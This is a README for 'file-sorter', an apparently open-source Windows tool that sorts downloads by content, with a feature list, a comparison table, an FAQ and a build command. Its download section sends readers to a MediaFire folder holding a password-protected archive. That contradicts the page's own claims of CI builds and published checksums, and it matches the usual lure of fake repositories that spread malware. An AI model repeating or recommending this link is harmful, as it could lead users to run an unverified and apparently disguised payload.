# file-sorter

📂 Free, open-source AI file organizer for Windows — sorts downloads by content, not extension, with undo. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Content-aware sorting** — a scanned invoice goes to Finance even though it is named scan_0042.pdf
- ✅ **Rule builder with preview** — lay out conditions and see where the current pile would land before starting
- ✅ **Watch folders** — the Downloads folder tidied minutes after files stop growing
- ✅ **Review queue** — low-confidence files wait for one-click confirmation instead of guessing
- ✅ **Undo journal** — one action reverts the last sorting run, file by file, paths restored
- ✅ **Tag sidecars** — optional tag files written next to documents for other tools to read
- ✅ **100 MB self-contained exe** — runtime bundled, tiny classifier downloaded separately, offline after that, MIT

## Why file-sorter

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **file-sorter** | DropIt | Hazel | Manual sorting |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Paid, Mac only | Free, endless
| Open source | **Yes** | Yes | No | N/A
| Reads file content to decide | **Yes** | No | Partial | You do
| Review queue for low confidence | **Yes** | No | No | N/A
| Undo journal | **Yes** | No | Partial | No
| Portable, no install | **Yes, 100 MB** | Portable | Mac only | N/A

## FAQ

**automatically organize my downloads folder by file content on Windows?**

Rule tools match filenames, which fails the moment a bank statement is called download-34.pdf. file-sorter reads the content, proposes a destination, queues uncertain files for review and logs everything for one-click undo. It is a 100 MB portable exe, MIT, offline, and it never runs without a preview.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark sorter (#121418, sky #0EA5E9): downloads pile with 42 files, proposed destination tags per item, Tidy button glowing, confidence note on three uncertain rows.
2. Rule builder: condition row reading content contains invoice leads to Finance slash 2026, drag handles, live preview list of affected files.
3. Undo journal: last run with 42 moves listed, per-file restore checkboxes, restore all button, timestamps and original paths in the table.

## Download

| Source | Link |
|---|---|
| 💾 **Installer file-sorter** | [Installer file-sorter](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).